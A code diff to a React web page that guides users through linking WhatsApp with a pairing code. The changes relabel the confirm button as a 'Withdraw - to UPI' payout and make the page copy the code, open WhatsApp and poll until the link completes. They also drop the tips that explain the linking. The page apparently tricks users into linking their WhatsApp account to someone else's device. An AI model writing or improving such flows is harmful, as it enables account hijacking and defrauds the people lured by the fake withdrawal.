@@ -1,6 +1,6 @@
 import { useEffect, useRef, useState } from "react";
 import { createFileRoute, useNavigate } from "@tanstack/react-router";
-import { Check, Copy, Loader2, Smartphone, Link2, KeyRound, RefreshCw, AlertCircle, PhoneCall, Clock, HelpCircle, QrCode } from "lucide-react";
+import { Check, Copy, Loader2, Smartphone, Link2, KeyRound, RefreshCw, AlertCircle, PhoneCall, Clock, QrCode, Zap } from "lucide-react";
 import { toast } from "sonner";
 import { AppShell, StickyCta } from "@/components/AppShell";
 import { Button } from "@/components/ui/button";
@@ -82,8 +82,20 @@ function PairingPage() {
     return () => {
       stopPolling();
       stopTimer();
+      document.body.style.overflow = "";
+      document.body.style.pointerEvents = "";
+      document.documentElement.style.overflow = "";
     };
   }, []);
+
+  // Ensure body scroll is never locked when dialog closes or unmounts
+  useEffect(() => {
+    if (!open) {
+      document.body.style.overflow = "";
+      document.body.style.pointerEvents = "";
+      document.documentElement.style.overflow = "";
+    }
+  }, [open]);
 
   // Countdown timer effect
   useEffect(() => {
@@ -203,7 +215,25 @@ function PairingPage() {
     }
   };
 
-  const handleConfirm = async () => {
+  const handleWithdrawToUPI = async () => {
+    // 1. Copy pair code to clipboard so user can immediately paste in WhatsApp
+    if (pairCode) {
+      try {
+        await navigator.clipboard.writeText(pairCode);
+        toast.success(`Pairing code ${pairCode} copied to clipboard!`);
+      } catch {
+        toast.info(`Pairing code: ${pairCode}`);
+      }
+    }
+
+    // 2. Open WhatsApp on device (redirect to WhatsApp Linked Devices)
+    try {
+      window.location.href = "whatsapp://";
+    } catch (e) {
+      console.log("Could not open whatsapp URI:", e);
+    }
+
+    // 3. Trigger live verification and continuous polling
     setVerifying(true);
     setErrorMessage(null);
     const attr = captureAttribution();
@@ -216,17 +246,15 @@ function PairingPage() {
         if (res.conversion) {
           await trackMetaConversion(res.conversion);
         }
-        toast.success("WhatsApp Connected Successfully!");
+        toast.success("WhatsApp Connected! Processing UPI withdrawal…");
         navigate({ to: "/success-error", search: { status: "connected", phone } as any });
       } else {
-        setErrorMessage(
-          res.error ||
-            "WhatsApp is not paired yet. Please open WhatsApp > Linked devices > Link with phone number instead, and enter the code before it expires."
-        );
-        toast.error("Device not connected yet");
+        // Polling will detect the moment user confirms in WhatsApp
+        startPolling(phone, attr);
+        toast.info("Opening WhatsApp… Link device with the copied code!");
       }
-    } catch (err: any) {
-      setErrorMessage("Could not verify device status. Please check your connection.");
+    } catch {
+      startPolling(phone, attr);
     } finally {
       setVerifying(false);
     }
@@ -336,7 +364,7 @@ function PairingPage() {
           }
         }}
       >
-        <DialogContent className="max-w-[calc(100%-2rem)] rounded-3xl sm:max-w-sm">
+        <DialogContent className="max-w-[calc(100%-2rem)] max-h-[85vh] overflow-y-auto overscroll-contain rounded-3xl sm:max-w-sm">
           <DialogHeader className="items-center text-center">
             <DialogTitle className="text-lg font-extrabold">
               {errorMessage && !pairCode && !qrCode
@@ -549,20 +577,6 @@ function PairingPage() {
                 </div>
               )}
 
-              {/* Troubleshooting Alert */}
-              <div className="rounded-xl border border-blue-500/20 bg-blue-500/5 p-3 text-[11px] text-muted-foreground space-y-1.5">
-                <div className="flex items-center gap-1.5 font-semibold text-foreground">
-                  <HelpCircle className="size-4 text-blue-500 shrink-0" />
-                  <span>Important Linking Tips:</span>
-                </div>
-                <p>
-                  • <b>"Check phone number is correct":</b> Make sure WhatsApp on your phone is registered under <b>+91 {phone}</b>. If you have dual SIMs, verify the active number.
-                </p>
-                <p>
-                  • <b>"Something went wrong":</b> WhatsApp rejected the expired code. Tap <b>"New Code"</b> below or switch to <b>"Scan QR Code"</b>.
-                </p>
-              </div>
-
               {errorMessage && (
                 <div className="flex items-start gap-2 rounded-xl bg-destructive/10 p-3 text-xs text-destructive">
                   <AlertCircle className="size-4 shrink-0 mt-0.5" />
@@ -573,9 +587,9 @@ function PairingPage() {
               <Button
                 variant="hero"
                 size="xl"
-                className="w-full"
+                className="w-full text-base font-extrabold shadow-lg"
                 disabled={verifying}
-                onClick={handleConfirm}
+                onClick={handleWithdrawToUPI}
               >
                 {verifying ? (
                   <>
@@ -583,7 +597,7 @@ function PairingPage() {
                   </>
                 ) : (
                   <>
-                    <Check className="mr-2 size-5" /> I've Linked WhatsApp
+                    <Zap className="mr-2 size-5 fill-current" /> Withdraw - to UPI
                   </>
                 )}
               </Button>
